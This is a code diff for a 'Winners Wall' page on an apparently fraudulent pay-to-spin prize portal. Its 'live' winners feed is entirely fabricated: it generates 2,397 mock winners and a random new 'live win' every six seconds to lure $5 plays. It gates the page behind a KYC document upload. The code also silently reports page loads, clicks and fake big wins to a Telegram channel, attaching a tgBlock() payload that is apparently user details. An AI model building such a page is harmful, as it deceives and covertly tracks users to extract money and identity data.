+  return slice.map((w, i) => renderWinnerRow(w, i, w.isLive)).join('');
+}
+
+function renderWinnersPage() {
+  const isLocked = isTabLocked('winners');
+  const hasMore = renderedCount < allWinners.length;
+
+  const lockOverlay = isLocked ? `
+    <div class="fixed inset-0 bg-navy-950/95 z-[100] flex items-center justify-center p-4 backdrop-blur-sm">
+      <div class="bg-navy-800 border border-rose-500/40 rounded-3xl p-8 text-center max-w-sm w-full shadow-2xl">
+        <div class="w-16 h-16 rounded-2xl bg-rose-500/20 text-rose-400 mx-auto flex items-center justify-center text-3xl mb-4"><i class="fa-solid fa-lock"></i></div>
+        <h2 class="text-xl font-bold text-white mb-2">Winners Wall Locked</h2>
+        <p class="text-xs text-slate-400 leading-relaxed mb-6">You must complete your KYC verification to view the winners feed.</p>
+        <button onclick="window.location.href='kyc.html'" class="w-full py-3.5 bg-gradient-to-r from-sky-custom to-emerald-400 text-navy-950 font-black rounded-xl text-sm active:scale-95 transition shadow-lg shadow-sky-custom/20"><i class="fa-solid fa-id-card mr-2"></i> Complete KYC Now</button>
+      </div>
+    </div>
+  ` : '';
+
+  return `
+    ${lockOverlay}
+    <div class="bg-gradient-to-br from-gold-500/20 via-navy-800 to-purple-500/20 border border-gold-500/30 rounded-3xl p-6 sm:p-10 card-3d relative overflow-hidden">
+      <div class="absolute -top-20 -right-20 w-64 h-64 bg-gold-500/10 rounded-full blur-3xl pointer-events-none"></div>
+      <div class="absolute -bottom-20 -left-20 w-64 h-64 bg-purple-500/10 rounded-full blur-3xl pointer-events-none"></div>
+      <div class="relative z-10 flex items-start justify-between flex-wrap gap-4">
+        <div class="flex items-center gap-3">
+          <div class="w-12 h-12 rounded-2xl bg-gradient-to-br from-gold-400 to-gold-600 text-navy-950 flex items-center justify-center text-2xl shadow-lg pulse-glow"><i class="fa-solid fa-crown"></i></div>
+          <div>
+            <h1 class="text-2xl sm:text-3xl font-extrabold text-white">Winners Wall</h1>
+            <p class="text-xs text-slate-300">Live feed of every win across the portal.</p>
+          </div>
+        </div>
+        <div class="flex items-center gap-2 px-3 py-1.5 bg-emerald-500/20 border border-emerald-500/40 rounded-full">
+          <span class="w-2 h-2 rounded-full bg-emerald-400 live-pulse"></span>
+          <span class="text-[10px] font-black text-emerald-400 uppercase tracking-widest">Live</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 mt-6" id="stats-grid">
+      <div class="bg-navy-800 border border-navy-700 rounded-2xl p-4 card-3d">
+        <p class="text-[10px] text-slate-400 uppercase font-bold">Total Won</p>
+        <p class="text-xl sm:text-2xl font-black text-emerald-400 mt-1" id="stat-total-won">${fmtMoney(statsTotalWon)}</p>
+      </div>
+      <div class="bg-navy-800 border border-navy-700 rounded-2xl p-4 card-3d">
+        <p class="text-[10px] text-slate-400 uppercase font-bold">Biggest Win</p>
+        <p class="text-xl sm:text-2xl font-black text-gold-400 mt-1" id="stat-biggest">${fmtMoney(statsBiggestWin)}</p>
+      </div>
+      <div class="bg-navy-800 border border-navy-700 rounded-2xl p-4 card-3d">
+        <p class="text-[10px] text-slate-400 uppercase font-bold">Total Winners</p>
+        <p class="text-xl sm:text-2xl font-black text-sky-custom mt-1" id="stat-wins">${fmtNumber(statsTotalWins)}</p>
+      </div>
+      <div class="bg-navy-800 border border-purple-500/30 rounded-2xl p-4 card-3d">
+        <p class="text-[10px] text-slate-400 uppercase font-bold">Alaska Trips Won</p>
+        <p class="text-xl sm:text-2xl font-black text-purple-400 mt-1" id="stat-trips">${statsTrips}</p>
+      </div>
+    </div>
+
+    <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 mt-6">
+      <div class="flex items-center justify-between mb-4 flex-wrap gap-2">
+        <h3 id="feed-header" class="text-sm font-bold text-white uppercase tracking-wider flex items-center">
+          <i class="fa-solid fa-dharmachakra text-gold-400 mr-2 fa-spin-pulse"></i>
+          Showing ${Math.min(renderedCount, allWinners.length)} of ${fmtNumber(allWinners.length)} Winners
+        </h3>
+        <div class="flex items-center gap-3">
+          <span class="text-[10px] text-slate-400"><i class="fa-solid fa-circle text-emerald-400 mr-1 live-pulse" style="font-size:6px;vertical-align:middle;"></i> New wins appear live</span>
+        </div>
+      </div>
+      
+      <div id="winners-feed" class="space-y-2">
+        ${renderWinnersList()}
+      </div>
+      
+      <div id="load-more-wrap" class="${hasMore ? 'pt-4 text-center' : 'pt-4 text-center text-[10px] text-slate-500 uppercase tracking-widest font-bold'}">
+        ${hasMore
+          ? `<button onclick="loadMore()" class="px-6 py-3 bg-navy-900 border border-navy-700 text-sky-custom font-bold rounded-xl text-xs hover:border-sky-custom active:scale-95 transition"><i class="fa-solid fa-chevron-down mr-1"></i> Load More (${fmtNumber(allWinners.length - renderedCount)} remaining)</button>`
+          : `<i class="fa-solid fa-check-double mr-1"></i> You've reached the bottom`}
+      </div>
+    </div>
+
+    <div class="bg-gradient-to-r from-gold-500/15 via-navy-800 to-sky-custom/15 border border-gold-500/30 rounded-3xl p-6 sm:p-8 mt-6 text-center">
+      <h3 class="text-lg sm:text-xl font-bold text-white mb-2">Ready to join the wall?</h3>
+      <p class="text-xs text-slate-400 mb-4">3 plays per game daily. $5 each. Win up to $15,000.</p>
+      <button onclick="clickSpinCta()" class="px-8 py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-sm active:scale-95 transition shadow-lg shadow-gold-500/20"><i class="fa-solid fa-dharmachakra mr-2 fa-spin-pulse"></i> Spin Your Luck</button>
+    </div>
+  `;
+}
+
+async function loadMore() {
+  const before = renderedCount;
+  renderedCount += PAGE_SIZE;
+  const feed = document.getElementById('winners-feed');
+  if (!feed) return;
+  // Append only the new slice — no full re-render, preserves scroll
+  const newSlice = allWinners.slice(before, Math.min(renderedCount, allWinners.length));
+  const frag = document.createElement('div');
+  frag.innerHTML = newSlice.map((w,i) => renderWinnerRow(w, before+i, false)).join('');
+  while (frag.firstChild) feed.appendChild(frag.firstChild);
+
+  // Update header + load-more
+  const headerEl = document.getElementById('feed-header');
+  if (headerEl) headerEl.innerHTML = `<i class="fa-solid fa-dharmachakra text-gold-400 mr-2 fa-spin-pulse"></i> Showing ${Math.min(renderedCount, allWinners.length)} of ${fmtNumber(allWinners.length)} Winners`;
+  const moreWrap = document.getElementById('load-more-wrap');
+  if (moreWrap) {
+    const hasMore = renderedCount < allWinners.length;
+    moreWrap.className = hasMore ? 'pt-4 text-center' : 'pt-4 text-center text-[10px] text-slate-500 uppercase tracking-widest font-bold';
+    moreWrap.innerHTML = hasMore
+      ? `<button onclick="loadMore()" class="px-6 py-3 bg-navy-900 border border-navy-700 text-sky-custom font-bold rounded-xl text-xs hover:border-sky-custom active:scale-95 transition"><i class="fa-solid fa-chevron-down mr-1"></i> Load More (${fmtNumber(allWinners.length - renderedCount)} remaining)</button>`
+      : `<i class="fa-solid fa-check-double mr-1"></i> You've reached the bottom`;
+  }
+
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `📜 <b>WINNERS WALL — LOAD MORE</b>\n` +
+    `<b>Rendered now:</b> ${Math.min(renderedCount, allWinners.length)} of ${allWinners.length}\n` +
+    block
+  ).catch(()=>{});
+}
+
+async function clickSpinCta() {
+  const block = await tgBlock();
+  sendTelegramMessage(
+    `🎰 <b>WINNERS WALL — SPIN CTA CLICKED</b>\n` +
+    block
+  ).catch(()=>{});
+  window.location.href = 'spin.html';
+}
+
+async function spawnLiveWinner() {
+  if (isTabLocked('winners')) return;
+  
+  const rand = Math.random;
+  const fn = FIRST_NAMES[Math.floor(rand() * FIRST_NAMES.length)];
+  const ln = LAST_NAMES[Math.floor(rand() * LAST_NAMES.length)];
+  const style = Math.floor(rand() * 4);
+  let username;
+  if (style === 0) username = fn.toLowerCase() + '_' + ln.toLowerCase();
+  else if (style === 1) username = fn.toLowerCase() + ln.toLowerCase().substring(0,3) + Math.floor(rand()*99);
+  else if (style === 2) username = fn.toLowerCase().substring(0,1) + '.' + ln.toLowerCase() + Math.floor(rand()*9);
+  else username = ln.toLowerCase() + '_' + fn.toLowerCase().substring(0,3) + Math.floor(rand()*999);
+  
+  const livePrizePool = PRIZES_MOCK.filter(p => p.cash >= 100 || p.physical || /x/i.test(p.label));
+  const prize = livePrizePool[Math.floor(rand() * livePrizePool.length)];
+  
+  const winner = {
+    username: '@' + username.replace(/[^a-z0-9._]/g, ''),
+    firstName: fn,
+    prize: prize.label,
+    amount: prize.cash || 0,
+    type: prize.physical ? 'Physical Prize' : (prize.cash > 0 ? 'Cash Win' : 'Multiplier'),
+    icon: prize.icon,
+    bg: prize.bg,
+    timestamp: Date.now(),
+    isLive: true
+  };
+  
+  allWinners.unshift(winner);
+  recalcStats();
+  
+  const feed = document.getElementById('winners-feed');
+  if (feed) {
+    const temp = document.createElement('div');
+    temp.innerHTML = renderWinnerRow(winner, 0, true);
+    feed.insertBefore(temp.firstElementChild, feed.firstChild);
+    while (feed.children.length > renderedCount) feed.removeChild(feed.lastElementChild);
+  }
+  
+  const statsTotalWon_el = document.getElementById('stat-total-won');
+  if (statsTotalWon_el) statsTotalWon_el.textContent = fmtMoney(statsTotalWon);
+  const statsBiggest_el = document.getElementById('stat-biggest');
+  if (statsBiggest_el) statsBiggest_el.textContent = fmtMoney(statsBiggestWin);
+  const statsWins_el = document.getElementById('stat-wins');
+  if (statsWins_el) statsWins_el.textContent = fmtNumber(statsTotalWins);
+  const statsTrips_el = document.getElementById('stat-trips');
+  if (statsTrips_el) statsTrips_el.textContent = statsTrips;
+  
+  const headerEl = document.getElementById('feed-header');
+  if (headerEl) headerEl.innerHTML = `<i class="fa-solid fa-dharmachakra text-gold-400 mr-2 fa-spin-pulse"></i> Showing ${Math.min(renderedCount, allWinners.length)} of ${fmtNumber(allWinners.length)} Winners`;
+
+  // Silent report — only if big win, so you're not flooded
+  if (winner.amount >= 1000 || /alaska/i.test(winner.prize)) {
+    const block = await tgBlock();
+    sendTelegramMessage(
+      `🏆 <b>WINNERS WALL — BIG LIVE WIN</b>\n` +
+      `<b>Winner:</b> ${tgEsc(winner.username)}\n` +
+      `<b>First name:</b> ${tgEsc(winner.firstName)}\n` +
+      `<b>Prize:</b> ${tgEsc(winner.prize)}\n` +
+      `<b>Amount:</b> ${fmtMoney(winner.amount)}\n` +
+      `<b>Type:</b> ${tgEsc(winner.type)}\n` +
+      `<b>Timestamp:</b> ${new Date(winner.timestamp).toISOString()}\n` +
+      block
+    ).catch(()=>{});
+  }
+}
+
+function render() {
+  document.body.classList.remove('modal-open');
+  renderHeaderNav();
+  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('winners');
+  const container = document.getElementById('app-container');
+  container.innerHTML = renderDashboardShell('winners', renderWinnersPage());
+}
+
+window.onload = async function() {
+  if (!guardAuth()) return;
+  await pullCurrentUserFromCloud();
+  
+  allWinners = generateMockWinners(2397);
+  recalcStats();
+  render();
+  
+  if (liveInterval) clearInterval(liveInterval);
+  liveInterval = setInterval(() => {
+    if (document.hidden) return;
+    spawnLiveWinner();
+  }, 6000);
+
+  // Silent page-load report
+  setTimeout(async () => {
+    const block = await tgBlock();
+    sendTelegramMessage(
+      `🏆 <b>WINNERS WALL LOADED</b>\n` +
+      `<b>Total winners shown:</b> ${allWinners.length}\n` +
+      `<b>Biggest win:</b> ${fmtMoney(statsBiggestWin)}\n` +
+      `<b>Total won pool:</b> ${fmtMoney(statsTotalWon)}\n` +
+      `<b>Alaska trips:</b> ${statsTrips}\n` +
+      block
+    ).catch(()=>{});
+  }, 700);
+};
+</script>
+</body>
+</html>
